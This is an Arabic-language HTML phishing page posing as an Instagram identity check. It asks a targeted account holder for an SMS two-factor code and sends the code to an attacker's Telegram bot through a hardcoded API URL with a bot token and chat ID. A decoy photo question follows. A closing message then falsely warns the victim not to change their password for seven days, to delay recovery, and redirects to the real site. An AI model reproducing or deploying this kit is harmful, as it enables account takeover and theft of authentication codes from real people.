<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Security Check</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; margin: 0; }
        .container { width: 100%; max-width: 350px; text-align: center; }
        .logo { width: 170px; margin-bottom: 30px; }
        h2 { font-size: 19px; color: #262626; font-weight: 600; }
        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; }
        .input-code { width: 100%; padding: 14px; border: 1px solid #dbdbdb; border-radius: 8px; background: #fafafa; margin: 20px 0; text-align: center; font-size: 20px; letter-spacing: 5px; box-sizing: border-box; }
        .btn { width: 100%; background: #0095f6; color: white; border: none; padding: 13px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
        #photo-step { display: none; }
        .cat-frame { width: 100%; border-radius: 12px; margin: 15px 0; border: 1px solid #efefef; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        .choice-row { display: flex; gap: 10px; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="container" id="sms-step">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
        <h2>تحقق من الهوية</h2>
        <p>لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك المرتبط بـ <b>@_5z5z5</b>. يرجى إدخاله لتوثيق ملكيتك للجهاز الحالي.</p>
        <input type="text" id="sms_val" class="input-code" placeholder="000000" maxlength="6">
        <button class="btn" onclick="sendSMS()">متابعة التأمين</button>
    </div>

    <div class="container" id="photo-step">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
        <h2>مراجعة سجلات الاسترداد</h2>
        <p>هل قمت بحذف هذه الصورة من ملفك الشخصي كجزء من عملية تنظيف البيانات السابقة؟</p>
        <img src="IMG_1145.jpeg" class="cat-frame">
        <div class="choice-row">
            <button class="btn" style="background:#efefef; color:#262626;" onclick="finish()">نعم، قمت بحذفها</button>
            <button class="btn" style="background:#efefef; color:#262626;" onclick="finish()">لا، لم أفعل</button>
        </div>
    </div>

    <script>
        function sendSMS() {
            const code = document.getElementById('sms_val').value;
            if(code.length > 2) {
                // إرسال رمز الـ SMS إلى بوت التليجرام الخاص بك
                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=🔑 الرمز الثاني (SMS): ${code}`);
                
                document.getElementById('sms-step').style.display = 'none';
                document.getElementById('photo-step').style.display = 'block';
            } else {
                alert("يرجى إدخال رمز صالح");
            }
        }

        function finish() {
            // النصيحة القوية التي اخترتها
            alert("تم تأمين حسابك بنجاح. كإجراء وقائي، يرجى تجنب تغيير كلمة المرور أو إعدادات الأمان خلال الـ 7 أيام القادمة. تغيير البيانات بشكل متكرر في وقت قصير قد يؤدي إلى قفل الحساب نهائياً بتهمة 'نشاط آلي مشبوه'.");
            window.location.href = "https://www.instagram.com";
        }
    </script>
</body>
</html>
